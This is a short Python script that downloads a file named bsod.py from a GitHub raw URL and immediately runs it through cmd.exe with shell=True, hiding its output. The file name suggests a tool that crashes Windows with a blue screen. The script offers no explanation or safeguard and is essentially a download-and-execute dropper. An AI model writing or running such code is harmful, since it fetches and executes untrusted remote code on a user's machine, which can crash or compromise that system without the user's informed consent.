import os
import urllib.request
import subprocess

url = "https://raw.githubusercontent.com/reefdzefrfd/nonam/refs/heads/main/bsod.py" 
filename = "bsod.py"
urllib.request.urlretrieve(url, filename)

command = "bsod.py 2"  
subprocess.run(f'cmd.exe /c {command}', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
